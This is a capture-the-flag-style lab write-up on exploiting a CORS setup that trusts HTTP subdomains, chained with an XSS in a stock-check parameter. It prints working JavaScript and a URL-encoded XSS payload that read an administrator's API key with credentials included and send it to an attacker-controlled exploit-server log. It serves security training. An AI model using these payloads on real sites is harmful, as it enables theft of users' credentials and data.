# LAB: CORS vulnerability with trusted insecure protocols

## Given:
- This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
- You can log in to your own account using the following credentials: wiener:peter


## Objective:
- To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. 
- The lab is solved when you successfully submit the administrator's API key.



## Key Concepts:

- **CORS (Cross-Origin Resource Sharing):** A security feature implemented by browsers to restrict web pages from making requests to a different domain than the one that served the web page.
- **Access-Control-Allow-Origin:** This header tells browsers which origins are permitted to read the response.
- **Access-Control-Allow-Credentials:** Allows cookies and HTTP authentication to be sent with cross-origin requests.
- **Subdomain Trust:** If a site trusts all subdomains, an attacker can exploit a subdomain (even over HTTP) to bypass CORS protections.

## Steps Taken:
1. Turn off Burp Suite intercept and log in to your account using the provided credentials.
2. Access your account page and review the network history. Notice that the API key is retrieved via an AJAX request to `/accountDetails`.
3. Observe the response headers, especially `Access-Control-Allow-Credentials`, which suggests CORS support.
4. Send the `/accountDetails` request to Burp Repeater. Add an `Origin` header like `http://subdomain.lab-id` and resend the request.
5. Confirm that the origin is reflected in the `Access-Control-Allow-Origin` header, showing that the CORS configuration allows access from arbitrary subdomains, regardless of protocol (HTTP or HTTPS).
6. Open a product page and click "Check stock". Notice it loads using an HTTP URL on a subdomain.
7. Find that the `productId` parameter is vulnerable to XSS, which can be leveraged for the attack.
8. Go to the exploit server and craft an HTML payload that injects a script via the vulnerable parameter. Replace `YOUR-LAB-ID` and `YOUR-EXPLOIT-SERVER-ID` with your actual lab and exploit server IDs.
9. Click "View exploit" to test. If successful, your API key appears in the exploit server logs.
10. Click "Deliver exploit to victim" to send the payload to the administrator.
11. Access the logs, retrieve the victim's API key, and submit it to complete the lab.
## Payloads Used:

```javascript
fetch(
    'https://[lab-url]/accountDetails',
    {method: 'get', credentials: 'include'})
    .then(res => res.json())
    .then(data => fetch(
        `https://[exploit-server-logs-url]/log?key=${data.apikey}`
    ))
```

```http
http://[http-store-url]/?productId=1%3Cscript%3Efetch(%27https://[lab-url]/accountDetails%27,%20{method:%20%27get%27,credentials:%20%27include%27}).then(res%20=%3E%20res.json()).then(data%20=%3E%20fetch(`https://[exploit-server-logs-url]/log?key=${data.apikey}`))%3C/script%3E&storeId=1
```

## Issues Encountered:

- The CORS misconfiguration was not immediately obvious without inspecting the headers.
- Some browsers may cache CORS responses, so changes may not reflect immediately.
- If the exploit does not work, double-check the payload and ensure the correct URLs are used.

## Solutions/Workarounds:

- Used Burp Suite to analyze and manipulate HTTP requests and responses.
- Verified the exploit server logs to confirm payload execution.
- Ensured the payload included `credentials: 'include'` to send cookies with the cross-origin request.
- Used the correct endpoint and parameter names as observed in the original requests.

## Takeaways:

- Always check CORS headers for insecure configurations, especially origin reflection and subdomain trust.
- Exploit servers are powerful tools for simulating real-world attacks and exfiltrating sensitive data.
- Understanding browser security features like CORS is essential for both attackers and defenders.
- Automating the attack with JavaScript can reliably extract sensitive information if CORS is misconfigured.
